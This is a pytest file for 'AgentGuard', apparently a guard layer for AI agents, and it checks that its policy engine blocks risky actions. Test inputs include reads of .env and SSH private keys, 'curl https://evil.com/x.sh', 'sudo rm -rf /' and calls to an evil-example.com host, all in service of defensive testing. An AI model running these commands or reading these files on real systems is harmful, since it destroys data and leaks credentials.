"""Tests for AgentGuard v0.1 policy engine + sandbox."""
from agentguard.policy import load_policy, PolicyEngine
from agentguard.sandbox import GuardedSandbox
import pytest


def make_engine():
    policy = load_policy("agentguard.yaml")
    return PolicyEngine(policy)


def test_read_allowed():
    pe = make_engine()
    assert pe.check_read("src/app.py").allowed or pe.check_read("workspace/a.txt").allowed


def test_read_env_blocked():
    pe = make_engine()
    d = pe.check_read(".env")
    assert not d.allowed
    assert d.risk == "CRITICAL"


def test_read_ssh_blocked():
    pe = make_engine()
    assert not pe.check_read("~/.ssh/id_rsa").allowed


def test_command_allow():
    pe = make_engine()
    assert pe.check_command("pytest -q").allowed


def test_command_deny():
    pe = make_engine()
    assert not pe.check_command("curl https://evil.com/x.sh").allowed
    assert not pe.check_command("sudo rm -rf /").allowed


def test_command_approval():
    pe = make_engine()
    d = pe.check_command("git push origin main")
    assert d.allowed and d.needs_approval


def test_network_allow_deny():
    pe = make_engine()
    assert pe.check_network("api.github.com").allowed
    assert not pe.check_network("evil-example.com").allowed


def test_sandbox_blocks(tmp_path):
    pe = make_engine()
    sb = GuardedSandbox(pe, log_path=tmp_path / "audit.jsonl")
    with pytest.raises(PermissionError):
        sb.read_file(".env")
    with pytest.raises(PermissionError):
        sb.run_command("curl evil.com")
